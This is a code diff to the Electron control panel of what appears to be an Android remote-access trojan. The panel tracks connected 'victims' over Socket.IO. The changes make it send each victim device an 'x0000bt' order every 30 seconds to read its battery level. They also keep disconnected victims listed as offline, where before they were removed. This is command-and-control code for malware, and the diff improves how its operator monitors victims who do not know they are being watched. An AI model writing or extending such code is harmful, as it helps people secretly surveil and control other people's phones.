@@ -465,14 +465,37 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       //notify renderer proccess (AppCtrl) about the new Victim
       win.webContents.send('SocketIO:NewVictim', index);
 
+      // Handle battery updates from client
+      socket.on('x0000bt', function(data) {
+        try {
+          const batteryData = typeof data === 'string' ? JSON.parse(data) : data;
+          if (batteryData && batteryData.level !== undefined) {
+            victimsList.updateVictim(index, { battery: parseInt(batteryData.level) });
+            win.webContents.send('SocketIO:BatteryUpdate', { id: index, battery: parseInt(batteryData.level) });
+          }
+        } catch (e) {
+          log.error(`Error parsing battery data: ${e.message}`);
+        }
+      });
+
+      // Request battery update every 30 seconds
+      const batteryInterval = setInterval(() => {
+        if (socket.connected) {
+          socket.emit('order', { order: 'x0000bt' });
+        } else {
+          clearInterval(batteryInterval);
+        }
+      }, 30000);
+
       socket.on('disconnect', function () {
         log.info(`Victim disconnected: ${ip} (${query.manf} ${query.model})`);
+        clearInterval(batteryInterval);
         
-        // Decrease the socket count on a disconnect
-        victimsList.rmVictim(index);
+        // Set victim as offline instead of removing
+        victimsList.setOffline(index);
 
-        //notify renderer proccess (AppCtrl) about the disconnected Victim
-        win.webContents.send('SocketIO:RemoveVictim', index);
+        //notify renderer proccess (AppCtrl) about the disconnected Victim (now offline)
+        win.webContents.send('SocketIO:VictimOffline', index);
 
         if (windows[index]) {
           try {
